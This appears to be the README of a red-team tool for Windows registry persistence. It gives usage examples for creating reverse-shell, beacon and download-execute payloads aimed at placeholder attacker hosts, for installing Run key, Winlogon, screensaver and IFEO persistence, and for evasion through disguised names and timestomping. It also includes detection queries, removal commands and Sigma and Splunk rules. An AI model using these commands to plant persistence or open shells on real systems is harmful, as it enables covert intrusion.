# Registry Persistence Framework

**Educational tool for demonstrating Windows registry-based persistence techniques**

⚠️ **WARNING**: This tool is for educational and authorized testing purposes only. Unauthorized use is illegal.

## Overview

A comprehensive framework demonstrating various Windows registry persistence mechanisms. This tool shows how attackers maintain access to compromised systems and helps defenders understand these techniques.

## Features

- **8 Persistence Methods**
  - HKCU/HKLM Run Keys
  - RunOnce Keys
  - Winlogon Userinit
  - Winlogon Shell
  - Screensaver Hijacking
  - Logon Scripts
  - IFEO Debugger Hijacking

- **Payload Generation**
  - PowerShell reverse shells
  - Beacon payloads
  - Download-execute
  - Custom payloads

- **Detection & Cleanup**
  - Scan for existing persistence
  - Auto-generate removal scripts
  - Detailed installation reports

## Installation

### Quick Setup

```bash
# Clone repository
git clone https://github.com/yourusername/registry-persistence
cd registry-persistence

# Install
pip install -e .

# Or run directly
python main.py --list
```

### File Structure

```
registry_persistence/
├── main.py                    # CLI entry point
├── config.py                  # Configuration
├── core/
│   ├── orchestrator.py       # Main coordinator
│   └── utils.py              # Utilities
├── methods/
│   ├── run_keys.py           # Run key methods
│   ├── winlogon.py           # Winlogon methods
│   ├── screensaver.py        # Screensaver hijack
│   ├── logon_script.py       # Logon scripts
│   └── ifeo.py               # IFEO hijacking
├── payload/
│   └── generator.py          # Payload creation
├── detection/
│   └── checker.py            # Persistence scanner
└── output/
    └── removal.py            # Removal scripts
```

## Usage

### List Available Methods

```bash
python main.py --list
```

### Check Existing Persistence

```bash
python main.py --check
```

### Create Payloads

```bash
# Reverse shell
python main.py --create-payload reverse_shell \
    --attacker-ip 192.168.1.100 \
    --attacker-port 4444

# Beacon
python main.py --create-payload beacon \
    --beacon-url http://attacker.com/beacon \
    --interval 60

# Download-execute
python main.py --create-payload download_execute \
    --download-url http://attacker.com/payload.exe
```

### Install Single Method

```bash
# HKCU Run key (no admin required)
python main.py --method run_key \
    --payload C:\Windows\Temp\payload.exe

# HKLM Run key (requires admin)
python main.py --method run_key_local_machine \
    --payload C:\payload.exe

# Custom registry name
python main.py --method run_key \
    --payload C:\payload.exe \
    --name "WindowsUpdate"

# Screensaver with custom timeout
python main.py --method screensaver \
    --payload C:\payload.exe \
    --timeout 120

# IFEO hijack
python main.py --method image_file_execution \
    --payload C:\payload.exe \
    --target-exe notepad.exe
```

### Install Multiple Methods

```bash
# Install 3 methods for redundancy
python main.py --multi run_key screensaver logon_script \
    --payload C:\payload.exe
```

### Python API Usage

```python
from core.orchestrator import RegistryPersistenceOrchestrator

# Initialize
rp = RegistryPersistenceOrchestrator()

# List methods
rp.list_methods()

# Create payload
payload_path = rp.create_payload(
    'reverse_shell',
    attacker_ip='192.168.1.100',
    attacker_port=4444
)

# Install persistence
result = rp.install_method('run_key', payload_path)

# Install multiple
results = rp.install_multiple(
    ['run_key', 'screensaver'],
    payload_path
)

# Check existing
rp.check_existing_persistence()

# Generate removal script
rp.generate_removal_script()
```

## Persistence Methods Explained

### 1. Run Keys (HKCU/HKLM)
- **Location**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Trigger**: User login
- **Admin**: No (HKCU), Yes (HKLM)
- **Detection**: Easy - most common location
- **Use Case**: Standard persistence

### 2. RunOnce Keys
- **Location**: `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- **Trigger**: Next login (single use)
- **Admin**: No (HKCU), Yes (HKLM)
- **Detection**: Easy
- **Use Case**: One-time execution

### 3. Winlogon Userinit
- **Location**: `HKLM\...\Winlogon\Userinit`
- **Trigger**: User login (early in process)
- **Admin**: Yes
- **Detection**: Medium - less commonly checked
- **Use Case**: Stealthier than Run keys

### 4. Winlogon Shell
- **Location**: `HKLM\...\Winlogon\Shell`
- **Trigger**: User login (replaces explorer.exe)
- **Admin**: Yes
- **Detection**: Hard - very suspicious when found
- **Use Case**: Maximum persistence (but breaks desktop if misconfigured)

### 5. Screensaver Hijack
- **Location**: `HKCU\Control Panel\Desktop`
- **Trigger**: Screensaver activation
- **Admin**: No
- **Detection**: Medium
- **Use Case**: Executes after idle time

### 6. Logon Scripts
- **Location**: `HKCU\Environment\UserInitMprLogonScript`
- **Trigger**: User login
- **Admin**: No
- **Detection**: Medium
- **Use Case**: Script-based persistence

### 7. IFEO Debugger Hijack
- **Location**: `HKLM\...\Image File Execution Options\<target>`
- **Trigger**: Target application launch
- **Admin**: Yes
- **Detection**: Medium
- **Use Case**: Intercept specific applications

## Detection

### Scanning for Persistence

```bash
python main.py --check
```

The scanner checks:
- All Run and RunOnce keys
- Winlogon modifications
- Screensaver settings
- Logon scripts
- IFEO hijacks

### Manual Detection

```cmd
# Check Run keys
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Check Winlogon
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell

# Check IFEO
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s /v Debugger
```

## Removal

### Automatic Removal

When you install persistence, removal scripts are automatically generated:

```bash
# Batch script
remove_persistence_20241118_143022.bat

# PowerShell script
remove_persistence_20241118_143022.ps1
```

Run these scripts to remove all installed persistence.

### Manual Removal

```cmd
# Remove Run key
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <NAME> /f

# Restore Winlogon Userinit
reg add "HKLM\...\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f

# Restore Winlogon Shell
reg add "HKLM\...\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f

# Disable screensaver
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f

# Remove IFEO hijack
reg delete "HKLM\...\Image File Execution Options\<target.exe>" /f
```

## Educational Use

### For Red Teamers
- Understand persistence methods for authorized assessments
- Test detection capabilities
- Practice OPSEC and evasion

### For Blue Teamers
- Learn attacker persistence techniques
- Develop detection rules
- Create response procedures
- Test detection tools

### Detection Rules

**Splunk**:
```spl
index=windows source="WinEventLog:Security" EventCode=4657
| where ObjectValueName IN ("Run", "RunOnce", "Userinit", "Shell", "Debugger")
| stats count by ObjectName ObjectValueName NewValue
```

**Sigma**:
```yaml
title: Registry Persistence Modification
detection:
  selection:
    EventID: 4657
    ObjectValueName:
      - 'Run'
      - 'RunOnce'
      - 'Userinit'
      - 'Shell'
      - 'Debugger'
  condition: selection
```

## Best Practices

### For Authorized Testing

1. **Get Written Permission**: Always have authorization
2. **Document Everything**: Keep detailed logs
3. **Clean Up**: Remove all persistence after testing
4. **Verify Removal**: Scan to confirm cleanup
5. **Report Findings**: Document for defenders

### OPSEC Considerations

- Use legitimate-looking names
- Timestamp match surrounding files
- Avoid known malicious locations
- Test detection before deployment
- Have backup persistence methods

## Troubleshooting

### Common Issues

**"Access Denied" Errors**
- Run as Administrator for HKLM operations
- Check User Account Control (UAC) settings

**Persistence Not Triggering**
- Verify payload path is correct
- Check if payload has execute permissions
- Review event logs for errors

**Detection Too Easy**
- Use multiple methods for redundancy
- Choose less common techniques
- Customize registry value names

## Legal & Ethical Notice

⚠️ **This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY**

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Understand your local laws and regulations
- This tool is provided for defensive security research

**The authors are not responsible for misuse of this tool.**

## MITRE ATT&CK Mapping

- **T1547.001** - Boot or Logon Autostart Execution: Registry Run Keys
- **T1546.010** - Event Triggered Execution: AppInit DLLs  
- **T1546.012** - Event Triggered Execution: Image File Execution Options
- **T1547.014** - Boot or Logon Autostart Execution: Active Setup

## References

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Microsoft Registry Documentation](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)
- [Windows Registry Forensics](https://www.sans.org/white-papers/)

## Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Add tests for new methods
4. Submit a pull request

## License

MIT License - See LICENSE file

## Author

Maxwell Cross - 30 Days of Red Team Series

## Disclaimer

This tool demonstrates techniques used by real attackers. Use responsibly and only in authorized environments.